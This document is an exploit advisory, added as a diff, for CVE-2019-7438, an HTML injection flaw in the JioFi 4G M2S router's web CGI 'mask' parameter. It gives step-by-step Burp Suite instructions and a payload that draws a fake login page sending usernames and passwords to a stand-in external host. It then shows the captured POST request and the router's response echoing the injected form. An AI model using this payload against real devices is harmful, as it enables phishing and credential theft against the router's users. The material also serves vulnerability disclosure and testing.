@@ -1,0 +1,63 @@
+# Exploit Title: cgi-bin/qcmap_web_cgi on  JioFi 4G M2S 1.0.2 devices has XSS and HTML injection via the mask POST  parameter.
+# Exploit Author:  Vikas Chaudhary
+# Date: 21-01-2019
+# Vendor Homepage: https://www.jio.com/
+# Hardware Link:  https://www.amazon.in/JioFi-Hotspot-M2S-Portable-Device/dp/B075P7BLV5/ref=sr_1_1?s=computers&ie=UTF8&qid=1531032476&sr=1-1&keywords=JioFi+M2S+Wireless+Data+Card++%28Black%29
+# Version: JioFi 4G Hotspot M2S 150 Mbps Wireless Router
+# Category: Hardware
+# Contact: https://www.facebook.com/profile.php?id=100011287630308
+# Web:  https://gkaim.com/
+# Tested on: Windows 10 X64- Firefox-65.0
+# CVE-2019-7438
+***********************************************************************
+## Vulnerability Description => HTML injection is an attack that is similar to Cross-site Scripting (XSS). While in the XSS vulnerability the attacker can inject and execute Javascript code, the HTML injection attack only allows the injection of certain HTML tags. When an application does not properly handle user supplied data, an attacker can supply valid HTML code, typically via a parameter value, and inject their own content into the page. This attack is typically used in conjunction with some form of social engineering, as the attack is exploiting a code-based vulnerability and a user's trust. 
+----------------------------------------
+# Proof Of ConceptoC
+1- First Open BurpSuite
+2- Make Intercept on 
+3 -Go to your Wifi Router's  Gateway in Browser  [i.e http://192.168.225.1 ]
+4-Capture the data and then Spider the Host
+5- Now You find a Link like like this  [ http://192.168.225.1/cgi-bin/qcmap_web_cgi ]
+6- Send it to repeter Now you will find parameter like this [ Page=GetWANInfo&mask=0&token=0 ]
+7-Vulnerable parameter is => mash 
+8-Paste this PAYLOAD in mask parameter and then show Response in browser 
+Payload => 
+
+<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:red; padding: 1em;"><h1><font color="white">Please login with valid credentials:- It's A Fake Login Page<br><form name="login" action="http://anysite.com/"><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>
+
+9- You will see a fake Login page on the screen -
+----------------------------------------------------------------------------------
+Vulnerable URL => Post Based => http://192.168.225.1/cgi-bin/qcmap_web_cgi => mask parameter -
+----------------------------------------------------------------------------------
+REQUEST 
+-------------------
+POST /cgi-bin/qcmap_web_cgi HTTP/1.1
+Host: 192.168.225.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: text/plain, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.225.1/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 550
+Connection: close
+
+Page=GetWANInfo&mask=<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:red; padding: 1em;"><h1><font color="white">Please login with valid credentials:- It's A Fake Login Page<br><form name="login" action="http://anysite.com/"><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>&token=0
+
+****************************
+RESPONSE
+-----------------
+
+HTTP/1.1 200 OK
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+X-Frame-Options: SAMEORIGIN
+connection: close
+Content-Type: text/html
+Content-Length: 1167
+Date: Mon, 21 Jan 2019 18:02:07 GMT
+Server: lighttpd/1.4.35
+
+{"Page":"GetWANInfo","Mask":"<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:red; padding: 1em;"><h1><font color="white">Please login with valid credentials:- It's A Fake Login Page<br><form name="login" action="http://anysite.com/"><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>","wan_status":"On","total_data_used":"10005648","wan_operation_mode":"NAT","wan_connection_mode":"DHCP","wan_mac":"40:C8:CB:07:2C:8A","host_name":"JMR1140-072C8A","multi_pdn":"Disabled","ipv4_addr":"10.153.220.101","ipv4_subnet":"255.255.255.252","ipv4_gateway":"10.153.220.102","ipv4_primary":"49.45.0.1","ipv4_secondary":"0.0.0.0","ipv6_addr":"2409:4060:218e:b511:89ec:3214:def1:f75b","ipv6_subnet":"64","ipv6_gateway":"fe80::c9b3:928a:5eca:7e1c","ipv6_primary":"2405:200:800::1","ipv6_secondary":"::","channel":"automatic","packet_loss":"0 / 0","total_data_used_dlink":"5.11 MB","total_data_used_ulink":"4.37 MB"}
+
+---------------------------------------------------------------------------------------------------------------
